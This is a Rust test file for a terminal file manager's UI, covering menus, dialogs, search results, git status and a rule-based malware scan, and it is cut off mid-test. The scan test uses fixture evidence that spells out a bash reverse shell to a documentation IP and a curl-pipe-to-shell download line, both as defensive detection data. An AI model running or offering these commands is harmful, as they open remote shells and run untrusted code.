fn mouse_targets_match_the_drawn_menu_and_brief_rows() -> Result<()> {
    use borg_core::{ListingMode, Pointer, Side};
    use crossterm::event::{MouseButton, MouseEvent, MouseEventKind};
    let mut stage = stage(SIZE, Motion::STILL)?;
    let click = |x, y| MouseEvent {
        kind: MouseEventKind::Down(MouseButton::Left),
        column: x,
        row: y,
        modifiers: KeyModifiers::NONE,
    };
    let hit = |stage: &Stage, x, y| borg_ui::mouse_input(&stage.state, click(x, y), false, stage.started);
    let buffer = stage.render(stage.started)?;
    let screen = Snapshot::from_buffer(buffer, &stage.palette, None);
    let (x, y) = screen.find("9Menu").unwrap();
    assert!(matches!(hit(&stage, x, y), Some(Msg::Pointer(Pointer::Action(borg_core::Action::OpenMenuBar)))));
    stage.send(hit(&stage, x, y).unwrap());
    let buffer = stage.render(stage.started)?;
    let screen = Snapshot::from_buffer(buffer, &stage.palette, None);
    let (x, y) = screen.find("Options").unwrap();
    assert!(matches!(hit(&stage, x, y), Some(Msg::Pointer(Pointer::Menu(4)))));
    stage.send(hit(&stage, x, y).unwrap());
    let buffer = stage.render(stage.started)?;
    let screen = Snapshot::from_buffer(buffer, &stage.palette, None);
    let (x, y) = screen.find("Theme…").unwrap();
    assert!(matches!(hit(&stage, x, y), Some(Msg::Pointer(Pointer::MenuItem(0)))));
    stage.send(key(KeyCode::Esc));
    stage.send(Msg::Pointer(Pointer::Action(borg_core::Action::SetListing(Side::Left, ListingMode::Brief))));
    let rect = stage.state.layout(stage.started).panels[0];
    let row = rect.y + 2;
    assert!(matches!(
        hit(&stage, rect.x + 3, row),
        Some(Msg::Pointer(Pointer::Panel { side: Side::Left, index: 1, .. }))
    ));
    let second = hit(&stage, rect.x + rect.width - 3, row).unwrap();
    let expected = stage.state.active_panel().rows() + 1;
    assert!(matches!(second, Msg::Pointer(Pointer::Panel { index, .. }) if index == expected));
    Ok(())
}

#[test]
fn settings_window_has_checkboxes() -> Result<()> {
    let mut stage = stage(SIZE, Motion::STILL)?;
    stage.send(borg_core::Msg::Pointer(borg_core::Pointer::Action(borg_core::Action::Settings)));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "[x] Screensaver when idle")?;
    ensure_text(&buffer, "[x] Return to panels after command")?;
    check("settings_window", &stage, buffer)
}

#[test]
fn dialogs_take_clicks_on_rows_and_key_hints_and_close_when_clicked_beside() -> Result<()> {
    use borg_core::{Action, Overlay, Pointer};
    use crossterm::event::{MouseButton, MouseEvent, MouseEventKind};
    let mut stage = stage(GridSize { cols: 90, rows: 34 }, Motion::STILL)?;
    let event = |kind, (column, row)| MouseEvent { kind, column, row, modifiers: KeyModifiers::NONE };
    let down = MouseEventKind::Down(MouseButton::Left);
    let find = |stage: &mut Stage, text: &str| -> Result<(u16, u16)> {
        let screen = Snapshot::from_buffer(stage.render(stage.started)?, &stage.palette, None);
        screen.find(text).with_context(|| format!("{text} on screen\n{}", screen.lines().join("\n")))
    };
    let hit = |stage: &Stage, kind, at| borg_ui::mouse_input(&stage.state, event(kind, at), false, stage.started);
    let pressed = |msg: Option<Msg>, code| matches!(msg, Some(Msg::Key(KeyEvent { code: c, .. })) if c == code);
    let tap = |stage: &mut Stage, text: &str| -> Result<Option<Msg>> {
        let at = find(stage, text)?;
        Ok(hit(stage, down, at))
    };

    // Themes: the wheel moves the choice, a click picks a row, a second click keeps it.
    stage.send(Msg::Pointer(Pointer::Action(Action::PickTheme)));
    let scrolled = hit(&stage, MouseEventKind::ScrollDown, (45, 15)).unwrap();
    assert!(matches!(scrolled, Msg::Pointer(Pointer::DialogScroll(1))));
    let paper = stage.state.appearance.choices().iter().find(|c| c.id == "paper").unwrap().name.to_string();
    let at = find(&mut stage, &paper)?;
    let picked = hit(&stage, down, at).unwrap();
    assert!(matches!(picked, Msg::Pointer(Pointer::DialogRow(_))), "{picked:?}");
    stage.send(picked);
    assert!(pressed(hit(&stage, down, at), KeyCode::Enter), "a click on the chosen row keeps it");
    let esc = find(&mut stage, "Esc cancel")?;
    assert!(pressed(hit(&stage, down, esc), KeyCode::Esc));
    stage.send(hit(&stage, down, (0, 1)).unwrap());
    assert!(stage.state.overlay.is_none(), "a click beside the picker closes it");

    // Settings scroll with the wheel; About closes when clicked beside.
    stage.send(Msg::Pointer(Pointer::Action(Action::Settings)));
    assert!(matches!(hit(&stage, MouseEventKind::ScrollUp, (45, 15)), Some(Msg::Pointer(Pointer::DialogScroll(-1)))));
    stage.send(key(KeyCode::Esc)).send(key(KeyCode::F(1)));
    stage.send(hit(&stage, down, (0, 1)).unwrap());
    assert!(stage.state.overlay.is_none(), "a click beside About closes it");

    // Remote hosts: the tabs, the rows and the keys in the border take clicks.
    stage.send(Msg::Key(KeyEvent::new(KeyCode::Char('h'), KeyModifiers::ALT)));
    stage.send(Msg::RemoteCatalog { choices: Vec::new(), complete: true });
    let client = |name: &str| borg_core::RemoteClient {
        name: name.into(),
        fingerprint: "aa:bb".into(),
        connections: None,
        key_changed: None,
    };
    stage.send(Msg::RemoteClients(vec![client("dev@laptop"), client("workstation")]));
    assert!(matches!(stage.state.overlay, Some(Overlay::Remotes(ref browser)) if browser.show_clients));
    let row = tap(&mut stage, "workstation")?.unwrap();
    assert!(matches!(row, Msg::Pointer(Pointer::DialogRow(1))), "{row:?}");
    assert!(pressed(tap(&mut stage, "R: refresh")?, KeyCode::Char('r')));
    let hosts = tap(&mut stage, " Hosts ")?;
    assert!(pressed(hosts, KeyCode::Tab), "the Hosts tab switches to the hosts");
    stage.send(key(KeyCode::Esc));

    // Remote access: a click picks a way to connect.
    stage.send(key(KeyCode::F(1))).send(key(KeyCode::Char('c')));
    let pick = tap(&mut stage, "Start Claude Code connected")?.unwrap();
    assert!(matches!(pick, Msg::Pointer(Pointer::DialogRow(1))), "{pick:?}");
    stage.send(pick);
    assert!(matches!(stage.state.overlay, Some(Overlay::Connect(ref connect)) if connect.pick == 1));
    stage.send(key(KeyCode::Esc));

    // 2048: a click toward a side of the board slides the tiles that way.
    stage.send(key(KeyCode::F(1)));
    chars("2048").for_each(|msg| {
        stage.send(msg);
    });
    assert!(matches!(stage.state.overlay, Some(Overlay::Game2048)));
    // The game is centred on the screen: 44 columns by 22 rows from (23, 6).
    assert!(pressed(hit(&stage, down, (25, 17)), KeyCode::Left));
    assert!(pressed(hit(&stage, down, (45, 26)), KeyCode::Down));
    assert!(pressed(hit(&stage, down, (45, 7)), KeyCode::Up));
    Ok(())
}

#[test]
fn markdown_renders_and_source_toggle_is_visible() -> Result<()> {
    let mut stage = stage(SIZE, Motion::STILL)?;
    let source = b"# Borg guide\n\nA **file manager** with `syntax highlighting`.\n\n- [x] Copy files\n- [ ] Read the guide\n\n```rust\nfn main() {\n    println!(\"Hello, Borg!\");\n}\n```\n\n[Project](https://example.com/borg)\n".to_vec();
    let path = PathBuf::from("/home/me/projects/borg/guide.md");
    let pager = borg_view::Pager::for_path(
        std::sync::Arc::new(source),
        &path,
        usize::from(SIZE.cols),
        usize::from(SIZE.rows - 1),
    )?;
    opened(&mut stage, borg_core::Viewer::new(path, borg_core::Content::Text(pager)));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "s source/render")?;
    check("markdown_rendered", &stage, buffer)?;
    stage.send(key(KeyCode::Char('s')));
    let buffer = stage.render(stage.started)?;
    check("markdown_source", &stage, buffer)
}

#[test]
fn multiline_recalled_prompt_keeps_all_rows_visible() -> Result<()> {
    let mut stage = stage(SIZE, Motion::STILL)?;
    stage
        .shell(b"\x1b[20;1H\x1b]133;A\x07$ \x1b]133;B\x07for file in *.rs; do\r\n    printf '%s\\n' \"$file\"\r\ndone");
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "for file in *.rs; do")?;
    ensure_text(&buffer, "done")?;
    check("multiline_prompt", &stage, buffer)
}

#[test]
fn git_plugin_shows_status_and_can_be_disabled() -> Result<()> {
    let mut stage = stage(SIZE, Motion::STILL)?;
    let dir = stage.state.panels[0].dir().to_path_buf();
    let generation = stage.state.panels[0].generation();
    let repository = borg_git::Repository::parse(
        dir.clone(),
        b"## main\0 M src/main.rs\0A  Cargo.toml\0MM README.md\0?? build.sh\0UU socket\0",
    )?;
    stage.send(Msg::GitStatus { side: borg_core::Side::Left, generation, dir, result: Ok(Some(repository)) });
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Git main")?;
    check("git_status", &stage, buffer)?;
    stage.state.panels[0].set_mode(borg_core::ListingMode::Brief);
    let buffer = stage.render(stage.started)?;
    check("git_status_brief", &stage, buffer)?;
    stage.state.panels[0].set_mode(borg_core::ListingMode::Full);
    let index = borg_core::menus(&stage.state).iter().position(|menu| menu.title == "Git").unwrap();
    stage.send(Msg::Pointer(borg_core::Pointer::Menu(index)));
    let buffer = stage.render(stage.started)?;
    check("git_menu", &stage, buffer)?;
    stage.state.overlay = Some(borg_core::Overlay::Plugins { selected: 0 });
    let buffer = stage.render(stage.started)?;
    check("plugins_enabled", &stage, buffer)?;
    stage.send(key(KeyCode::Char(' ')));
    let buffer = stage.render(stage.started)?;
    check("plugins_disabled", &stage, buffer)?;
    stage.send(key(KeyCode::Esc));
    let buffer = stage.render(stage.started)?;
    check("git_disabled_panels", &stage, buffer)
}

#[test]
fn git_and_plugin_windows_survive_tiny_terminals() -> Result<()> {
    for (cols, rows) in [(20, 8), (2, 2), (1, 1), (0, 0)] {
        let mut stage = stage(SIZE, Motion::STILL)?;
        let dir = stage.state.panels[0].dir().to_path_buf();
        let generation = stage.state.panels[0].generation();
        let repository = borg_git::Repository::parse(dir.clone(), b"## a-very-long-branch-name\0MM Cargo.toml\0")?;
        stage.send(Msg::GitStatus { side: borg_core::Side::Left, generation, dir, result: Ok(Some(repository)) });
        stage.send(Msg::Resize { cols, rows });
        stage.emulator.resize(GridSize::console(cols, rows));
        stage.render(stage.started)?;
        stage.state.overlay = Some(borg_core::Overlay::Plugins { selected: 0 });
        stage.render(stage.started)?;
    }
    Ok(())
}

fn collected_stage(size: GridSize) -> Result<Stage> {
    let mut stage = stage(size, Motion::STILL)?;
    let mut first = entry("config.toml", EntryKind::File, 1024, RECENT, false);
    first.source = Some("/workspace/api/config.toml".into());
    let mut second = entry("config.toml", EntryKind::File, 4096, OLD, false);
    second.source = Some("/workspace/web/config.toml".into());
    let mut missing = entry("draft.md", EntryKind::File, 0, OLD, false);
    missing.source = Some("/workspace/archive/draft.md".into());
    missing.missing = true;
    stage.state.result_history[0] = Some(stage.state.panels[0].clone());
    stage.state.panels[0].open_results(
        borg_core::ResultSource::Collection("Release bundle".into()),
        vec![first, second, missing],
        50,
    );
    stage.send(Msg::Resize { cols: size.cols, rows: size.rows });
    stage.state.panels[0].toggle_mark();
    Ok(stage)
}

#[test]
fn virtual_collection_expanded_and_grouped() -> Result<()> {
    let mut stage = collected_stage(GridSize { cols: 132, rows: 28 })?;
    stage.state.panels[0].results.as_mut().unwrap().expanded = true;
    let buffer = stage.render(stage.started)?;
    check("collection_expanded", &stage, buffer)?;
    stage.state.panels[0].group_results(borg_core::ResultGroup::Folder);
    let buffer = stage.render(stage.started)?;
    check("collection_grouped", &stage, buffer)?;
    stage.state.panels[0].filter_results("/web/".into());
    let buffer = stage.render(stage.started)?;
    check("collection_filtered_hidden_marks", &stage, buffer)
}

#[test]
fn virtual_collection_narrow_and_split() -> Result<()> {
    let mut stage = collected_stage(NARROW)?;
    let buffer = stage.render(stage.started)?;
    check("collection_narrow", &stage, buffer)?;
    stage.send(Msg::Resize { cols: SIZE.cols, rows: SIZE.rows });
    stage.state.panels[0].results.as_mut().unwrap().expanded = false;
    let buffer = stage.render(stage.started)?;
    check("collection_split", &stage, buffer)
}

#[test]
fn recursive_search_partial_and_cancelled() -> Result<()> {
    let mut stage = collected_stage(SIZE)?;
    let entries = stage.state.panels[0].entries().to_vec();
    stage.state.panels[0].open_results(
        borg_core::ResultSource::Search {
            request: borg_core::SearchRequest {
                skip: None,
                root: "/workspace".into(),
                query: "*.toml".into(),
                hidden: false,
                options: Default::default(),
            },
            progress: Box::new(borg_core::SearchProgress {
                visited: 1234,
                errors: 2,
                skipped: 4,
                limited: false,
                cancelled: false,
                ..Default::default()
            }),
        },
        entries,
        51,
    );
    stage.state.panels[0].begin_search(51);
    let buffer = stage.render(stage.started)?;
    check("search_in_progress", &stage, buffer)?;
    stage.send(Msg::Pointer(borg_core::Pointer::Action(borg_core::Action::CancelSearch)));
    let buffer = stage.render(stage.started)?;
    check("search_cancelled", &stage, buffer)
}

/// A finished search below `/workspace` for files containing the whole word `todo`, which
/// found its first match in `handlers.rs`, whose text it returns.
fn contents_results(stage: &mut Stage) -> Result<String> {
    use borg_core::{LineMatch, ResultSource, SearchKind, SearchOptions, SearchProgress, Side};

    let source = (1..=60)
        .map(|i| match i {
            42 => "    // TODO: retry on timeout\n".to_owned(),
            51 => "    let todo = queue.pop();\n".to_owned(),
            _ => format!("    handle(request, {i});\n"),
        })
        .collect::<String>();
    let offset = source.find("TODO").context("the match")? as u64;
    let contents = borg_view::Query { text: "todo".into(), words: true, ..Default::default() };
    let request = borg_core::SearchRequest {
        skip: None,
        root: "/workspace".into(),
        query: "*".into(),
        hidden: false,
        options: SearchOptions { kind: SearchKind::Files, contents: Some(Box::new(contents)), ..Default::default() },
    };
    let found = |path: &str, size: u64, line: u64, before: &str, found: &str, after: &str| {
        let mut file = entry(path.rsplit('/').next().unwrap_or(path), EntryKind::File, size, RECENT, false);
        file.source = Some(path.into());
        let line = LineMatch { line, offset, before: before.into(), found: found.into(), after: after.into() };
        (file, line)
    };
    stage.state.result_history[0] = Some(stage.state.panels[0].clone());
    stage.state.panels[0].open_results(ResultSource::Search { request, progress: Default::default() }, Vec::new(), 60);
    stage.state.panels[0].begin_search(60);
    let found = vec![
        found("/workspace/api/src/handlers.rs", 2_048, 42, "    // ", "TODO", ": retry on timeout"),
        found("/workspace/web/app.js", 9_310, 7, "  const total = items.length; // ", "todo", " paging"),
        found("/workspace/notes.md", 412, 3, "Ship it once the ", "todo", " list is empty"),
    ];
    stage.send(Msg::Found { side: Side::Left, generation: 60, found });
    let progress = SearchProgress { visited: 214, read: 187, unread: 9, ..Default::default() };
    stage.send(Msg::SearchProgress { side: Side::Left, generation: 60, progress });
    stage.send(Msg::Listed { side: Side::Left, generation: 60, error: None });
    Ok(source)
}

#[test]
fn contents_search_dialog_results_and_landings_in_the_viewer_and_editor() -> Result<()> {
    use borg_core::{Action, Pointer};
    use std::sync::Arc;

    let mut stage = stage(GridSize { cols: 110, rows: 30 }, Motion::STILL)?;
    stage.send(Msg::Pointer(Pointer::Action(Action::Search)));
    stage.send(key(KeyCode::Tab));
    for msg in chars("todo") {
        stage.send(msg);
    }
    stage.send(Msg::Key(KeyEvent::new(KeyCode::Char('w'), KeyModifiers::ALT)));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Containing")?;
    ensure_text(&buffer, "Alt-C case · Alt-W whole words")?;
    let screen = Snapshot::from_buffer(buffer.clone(), &stage.palette, None);
    let (x, y) = screen.find(" ab ").context("the whole words switch")?;
    assert_ne!(screen.style_at(x + 1, y), screen.style_at(x - 3, y), "whole words is on, case is off");
    check("search_contents_dialog", &stage, buffer)?;
    stage.send(key(KeyCode::Esc));

    let source = contents_results(&mut stage)?;
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "finished · 187 files read · 9 binary or too large")?;
    ensure_text(&buffer, "42: // TODO: retry")?;
    check("search_contents_results", &stage, buffer)?;
    stage.state.panels[0].results.as_mut().context("results")?.expanded = true;
    stage.send(Msg::Resize { cols: 110, rows: 30 });
    let buffer = stage.render(stage.started)?;
    check("search_contents_results_expanded", &stage, buffer)?;

    stage.send(key(KeyCode::Down)).send(key(KeyCode::F(3)));
    let path = PathBuf::from("/workspace/api/src/handlers.rs");
    let (width, height) = borg_core::viewer_size(stage.state.cols, stage.state.rows);
    let pager = borg_view::Pager::new(Arc::new(source.clone().into_bytes()), width, height)?;
    let viewer = borg_core::Viewer::new(path.clone(), borg_core::Content::Text(pager));
    send_and_search(&mut stage, Msg::Opened(viewer));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "1 of 2")?;
    check("search_contents_viewer", &stage, buffer)?;

    stage.send(key(KeyCode::Esc)).send(key(KeyCode::F(10))).send(key(KeyCode::F(4)));
    anyhow::ensure!(stage.state.viewer.is_none(), "the viewer closed");
    let stamp = borg_core::FileStamp { len: source.len() as u64, modified: None, inode: 1 };
    let file = borg_core::EditorFile { path, text: source, stamp };
    stage.send(Msg::EditorOpened(borg_core::EditorSlot::Screen, Ok(file)));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "1 of 2")?;
    ensure_text(&buffer, "let todo = queue.pop();")?;
    check("search_contents_editor", &stage, buffer)
}

#[test]
fn rules_search_dialog_and_results_name_the_rules_each_file_matched() -> Result<()> {
    use borg_core::{Action, Pointer, ResultSource, SearchKind, SearchOptions, SearchProgress, Side};
    use borg_rules::{Evidence, Level, Problem, RuleMatch};

    let mut stage = stage(GridSize { cols: 110, rows: 30 }, Motion::STILL)?;
    stage.send(Msg::Pointer(Pointer::Action(Action::Search)));
    for _ in 0..3 {
        stage.send(key(KeyCode::Tab));
    }
    stage.send(key(KeyCode::Left));
    stage.send(key(KeyCode::Left));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Rule matches")?;
    anyhow::ensure!(!Snapshot::from_buffer(buffer.clone(), &stage.palette, None).contains("Containing"));
    check("search_rules_dialog", &stage, buffer)?;
    stage.send(key(KeyCode::Esc));

    let request = borg_core::SearchRequest {
        skip: None,
        root: "/home/me/Downloads".into(),
        query: "*".into(),
        hidden: false,
        options: SearchOptions { kind: SearchKind::Rules, ..Default::default() },
    };
    stage.state.result_history[0] = Some(stage.state.panels[0].clone());
    stage.state.panels[0].open_results(ResultSource::Search { request, progress: Default::default() }, Vec::new(), 61);
    stage.state.panels[0].begin_search(61);
    let hit = |rule: &str, namespace: &str, level, offset, bytes: &[u8]| RuleMatch {
        rule: rule.into(),
        namespace: namespace.into(),
        level,
        description: None,
        false_positives: None,
        evidence: Some(Evidence { string: "$a".into(), offset, length: bytes.len() as u64, bytes: bytes.to_vec() }),
    };
    let found = |path: &str, size: u64, hits: Vec<RuleMatch>| {
        let mut file = entry(path.rsplit('/').next().unwrap_or(path), EntryKind::File, size, RECENT, false);
        file.source = Some(path.into());
        (file, hits)
    };
    let user = "/home/me/.config/borg-commander/rules/stealers.yar";
    let found = vec![
        found(
            "/home/me/Downloads/setup.sh",
            4_812,
            vec![
                hit("reverse_shell", borg_rules::BUILT_IN, Level::Alert, 912, b"bash -i >& /dev/tcp/203.0.113.7/4444"),
                hit(
                    "download_and_run",
                    borg_rules::BUILT_IN,
                    Level::Notice,
                    120,
                    b"curl -fsSL https://example.net/i | sh",
                ),
            ],
        ),
        found(
            "/home/me/Downloads/tool",
            2_310_144,
            vec![hit("upx_packed", borg_rules::BUILT_IN, Level::Notice, 236, b"UPX!")],
        ),
        found(
            "/home/me/Downloads/Invoice.app.zip",
            88_412,
            vec![hit("MacStealer_Prompt", user, Level::Warning, 4_096, b"\x00\x01display dialog")],
        ),
    ];
    stage.send(Msg::RuleHits { side: Side::Left, generation: 61, found });
    let left_out =
        vec![Problem { file: "/home/me/.config/borg-commander/rules/old.yar".into(), message: "syntax error".into() }];
    let progress = SearchProgress { visited: 240, read: 230, unread: 2, rules: 16, left_out, ..Default::default() };
    stage.send(Msg::SearchProgress { side: Side::Left, generation: 61, progress });
    stage.send(Msg::Listed { side: Side::Left, generation: 61, error: None });
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "230 files scanned with 16 rules")?;
    ensure_text(&buffer, "reverse_shell +1")?;
    check("search_rules_results", &stage, buffer)?;
    stage.state.panels[0].results.as_mut().context("results")?.expanded = true;
    stage.send(Msg::Resize { cols: 110, rows: 30 });
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "rule files left out: 1")?;
    ensure_text(&buffer, "MacStealer_Prompt 00 01 64 69")?;
    check("search_rules_results_expanded", &stage, buffer)
}

#[test]
fn packed_executables_show_how_much_of_their_code_has_high_entropy() -> Result<()> {
    use borg_core::{Action, Pointer, ResultSource, SearchKind, SearchOptions, SearchProgress, Side};
    use borg_view::entropy::{BLOCK, Entropy, Tally};

    let mut stage = stage(GridSize { cols: 110, rows: 30 }, Motion::STILL)?;
    stage.send(Msg::Pointer(Pointer::Action(Action::Search)));
    for _ in 0..3 {
        stage.send(key(KeyCode::Tab));
    }
    stage.send(key(KeyCode::Left));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Packed executables")?;
    anyhow::ensure!(!Snapshot::from_buffer(buffer.clone(), &stage.palette, None).contains("Containing"));
    check("search_packed_dialog", &stage, buffer)?;
    stage.send(key(KeyCode::Esc));

    let request = borg_core::SearchRequest {
        skip: None,
        root: "/home/me/Downloads".into(),
        query: "*".into(),
        hidden: false,
        options: SearchOptions { kind: SearchKind::Packed, ..Default::default() },
    };
    stage.state.result_history[0] = Some(stage.state.panels[0].clone());
    stage.state.panels[0].open_results(ResultSource::Search { request, progress: Default::default() }, Vec::new(), 62);
    stage.state.panels[0].begin_search(62);
    let high = Entropy::of(&(0..=255u8).cycle().take(BLOCK as usize).collect::<Vec<_>>());
    let code = Entropy::of(&[0x48, 0x89, 0xe5, 0xc3, 0x55, 0x8b].repeat(700));
    let found = |path: &str, size: u64, blocks: u64, high_blocks: u64| {
        let mut file = entry(path.rsplit('/').next().unwrap_or(path), EntryKind::File, size, RECENT, false);
        file.source = Some(path.into());
        let mut tally = Tally::default();
        (0..blocks).for_each(|block| tally.add(block * BLOCK, if block < blocks - high_blocks { code } else { high }));
        (file, tally)
    };
    let found = vec![
        found("/home/me/Downloads/tool", 2_310_144, 560, 548),
        found("/home/me/Downloads/updater/helper", 812_032, 196, 141),
    ];
    stage.send(Msg::PackedHits { side: Side::Left, generation: 62, found });
    let progress = SearchProgress { visited: 240, read: 37, unread: 201, ..Default::default() };
    stage.send(Msg::SearchProgress { side: Side::Left, generation: 62, progress });
    stage.send(Msg::Listed { side: Side::Left, generation: 62, error: None });
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "37 programs read · 201 other files")?;
    ensure_text(&buffer, "97% high · max 8")?;
    check("search_packed_results", &stage, buffer)
}

#[test]
fn contents_results_preview_and_edit_their_match_beside_the_list() -> Result<()> {
    use borg_core::{Aside, EditorSlot, Effect, Peek, Peeked, Side};
    use std::sync::Arc;

    let mut stage = stage(GridSize { cols: 110, rows: 30 }, Motion::STILL)?;
    let source = contents_results(&mut stage)?;
    stage.send(key(KeyCode::Down));
    let effects = borg_core::update(&mut stage.state, ctrl('q'), stage.started);
    let Some(Effect::Peek { path, at: Some(at), size, .. }) =
        effects.into_iter().find(|effect| matches!(effect, Effect::Peek { .. }))
    else {
        anyhow::bail!("the quick view asks for the match")
    };
    let mut pager = borg_view::Pager::for_path(Arc::new(source.clone().into_bytes()), &path, size.0, size.1)?;
    borg_core::land_on_match(&mut pager, &at, &|_| true)?;
    stage.send(Msg::Peeked(Peeked {
        aside: Aside::QuickView,
        path: path.clone(),
        at: Some(at),
        peek: Peek::Text(pager),
    }));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "// TODO: retry on timeout")?;
    check("search_contents_quick_view", &stage, buffer)?;

    let slot = EditorSlot::Panel(Side::Right);
    let alt_e = Msg::Key(KeyEvent::new(KeyCode::Char('e'), KeyModifiers::ALT));
    let effects = borg_core::update(&mut stage.state, alt_e, stage.started);
    anyhow::ensure!(effects == [Effect::OpenEditor { path: path.clone(), slot }], "the other panel takes the editor");
    let stamp = borg_core::FileStamp { len: source.len() as u64, modified: None, inode: 1 };
    stage.send(Msg::EditorOpened(slot, Ok(borg_core::EditorFile { path, text: source, stamp })));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "1 of 2")?;
    ensure_text(&buffer, "app.js")?;
    check("search_contents_editor_beside", &stage, buffer)
}

#[test]
fn results_panel_resizes_without_buffer_overrun() -> Result<()> {
    let mut stage = collected_stage(SIZE)?;
    for (cols, rows) in [(1, 1), (4, 3), (20, 8), (80, 24), (193, 40)] {
        stage.send(Msg::Resize { cols, rows });
        stage.render(stage.started)?;
    }
    Ok(())
}

#[test]
fn mouse_sort_headers_and_group_rows_match_results_geometry() -> Result<()> {
    use borg_core::{Pointer, Side, SortKey};
    use crossterm::event::{MouseButton, MouseEvent, MouseEventKind};
    let mut stage = collected_stage(GridSize { cols: 132, rows: 28 })?;
    let click = |x, y| MouseEvent {
        kind: MouseEventKind::Down(MouseButton::Left),
        column: x,
        row: y,
        modifiers: KeyModifiers::NONE,
    };
    let buffer = stage.render(stage.started)?;
    let screen = Snapshot::from_buffer(buffer, &stage.palette, None);
    let (x, y) = screen.find("Size").unwrap();
    let hit = borg_ui::mouse_input(&stage.state, click(x, y), false, stage.started).unwrap();
    assert!(matches!(hit, Msg::Pointer(Pointer::ResultSort { side: Side::Left, key: SortKey::Size })));
    stage.send(hit);
    assert_eq!(stage.state.active_panel().sort().key, SortKey::Size);
    assert!(stage.state.active_panel().sort().reverse);
    stage.state.panels[0].group_results(borg_core::ResultGroup::Folder);
    let before = stage.state.active_panel().len();
    let buffer = stage.render(stage.started)?;
    let screen = Snapshot::from_buffer(buffer, &stage.palette, None);
    let (x, y) = screen.find("/workspace/api · 1").unwrap();
    let hit = borg_ui::mouse_input(&stage.state, click(x, y), true, stage.started).unwrap();
    stage.send(hit);
    assert_eq!(stage.state.active_panel().len(), before - 1);
    stage.send(ctrl('q'));
    let preview = stage.state.layout(stage.started).panels[1];
    let scroll = MouseEvent {
        kind: MouseEventKind::ScrollDown,
        column: preview.x + 1,
        row: preview.y + 1,
        modifiers: KeyModifiers::NONE,
    };
    assert!(matches!(
        borg_ui::mouse_input(&stage.state, scroll, false, stage.started),
        Some(Msg::Pointer(Pointer::ScrollDocument(_)))
    ));
    Ok(())
}

#[test]
fn discovery_windows_and_folder_totals() -> Result<()> {
    use borg_core::{
        Action, Collection, Pointer, ResultSource, SearchKind, SearchOptions, SearchProgress, SearchRequest,
    };
    let mut stage = collected_stage(GridSize { cols: 132, rows: 28 })?;
    stage.state.collections = (0..24)
        .map(|index| Collection {
            name: format!("Workspace bundle {index:02}"),
            entries: stage.state.panels[0].entries().to_vec(),
        })
        .collect();
    stage.send(Msg::Pointer(Pointer::Action(Action::OpenCollection)));
    stage.send(key(KeyCode::End));
    let buffer = stage.render(stage.started)?;
    check("collections_chooser", &stage, buffer)?;
    stage.send(key(KeyCode::F(7)));
    stage.send(Msg::Paste("Release notes".into()));
    let buffer = stage.render(stage.started)?;
    check("collection_create", &stage, buffer)?;
    stage.send(key(KeyCode::Esc)).send(key(KeyCode::Esc));
    stage.send(Msg::Pointer(Pointer::Action(Action::AnalyzeSpace)));
    let buffer = stage.render(stage.started)?;
    check("space_search_dialog", &stage, buffer)?;
    stage.send(key(KeyCode::Esc));
    let mut cache = entry("node_modules", EntryKind::Dir, 812_045_312, RECENT, false);
    cache.source = Some("/workspace/website/node_modules".into());
    cache.usage = Some(borg_vfs::FolderUsage { files: 72_419, folders: 3_128, partial: false, ..Default::default() });
    let mut build = entry("target", EntryKind::Dir, 4_521_148_416, RECENT, false);
    build.source = Some("/workspace/service/target".into());
    build.usage = Some(borg_vfs::FolderUsage { files: 12_804, folders: 294, partial: false, ..Default::default() });
    let mut partial = entry("cache", EntryKind::Dir, 123_456_789, RECENT, false);
    partial.source = Some("/workspace/archive/cache".into());
    partial.usage = Some(borg_vfs::FolderUsage { files: 9_240, folders: 129, partial: true, ..Default::default() });
    stage.state.panels[0].open_results(
        ResultSource::Search {
            request: SearchRequest {
                skip: None,
                root: "/workspace".into(),
                query: "*".into(),
                hidden: true,
                options: SearchOptions { kind: SearchKind::FolderTotals, ..Default::default() },
            },
            progress: Box::new(SearchProgress {
                measured: at(RECENT),
                visited: 99_104,
                errors: 1,
                ..Default::default()
            }),
        },
        vec![cache, build, partial],
        80,
    );
    stage.state.panels[0].set_sort(borg_core::Sort { key: borg_core::SortKey::Size, reverse: true });
    stage.state.panels[0].results.as_mut().unwrap().expanded = true;
    let buffer = stage.render(stage.started)?;
    check("folder_sizes", &stage, buffer)?;
    stage.state.panels[0].cache_observations();
    let buffer = stage.render(stage.started)?;
    check("folder_sizes_cached", &stage, buffer)?;
    stage.send(key(KeyCode::F(8)));
    let buffer = stage.render(stage.started)?;
    check("folder_delete_confirm", &stage, buffer)?;
    stage.send(key(KeyCode::Esc)).send(key(KeyCode::F(10)));
    let buffer = stage.render(stage.started)?;
    check("quit_confirm", &stage, buffer)
}

#[test]
fn remote_session_removal_confirmation_and_progress() -> Result<()> {
    let mut stage = staged(Motion::STILL, QUIET, project(), CLOCK)?;
    stage.send(Msg::Key(KeyEvent::new(KeyCode::Char('h'), KeyModifiers::ALT)));
    stage.send(Msg::RemoteCatalog {
        choices: vec![borg_core::RemoteChoice {
            machine: "production".into(),
            session: Some("junk".into()),
            name: "Scratch".into(),
            ..Default::default()
        }],
        complete: true,
    });
    stage.send(key(KeyCode::Delete));
    let buffer = stage.render(stage.started)?;
    check("remote_session_remove_confirm", &stage, buffer)?;
    stage.send(key(KeyCode::Char('y')));
    let buffer = stage.render(stage.started)?;
    check("remote_session_removing", &stage, buffer)
}

#[test]
fn remote_colony_lists_incoming_clients_and_their_connection_status() -> Result<()> {
    let mut stage = staged(Motion::STILL, QUIET, project(), CLOCK)?;
    stage.send(Msg::Key(KeyEvent::new(KeyCode::Char('h'), KeyModifiers::ALT)));
    stage.send(Msg::RemoteCatalog { choices: Vec::new(), complete: true });
    stage.send(Msg::RemoteClients(vec![
        borg_core::RemoteClient {
